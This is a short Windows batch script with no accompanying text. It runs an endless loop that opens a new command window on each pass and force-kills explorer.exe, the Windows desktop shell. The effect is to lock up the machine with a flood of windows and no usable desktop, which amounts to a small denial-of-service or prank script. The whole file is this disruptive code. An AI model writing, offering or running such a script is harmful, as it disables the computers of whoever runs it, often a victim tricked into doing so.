@echo off
:loop
start
taskkill /f /im explorer.exe
goto loop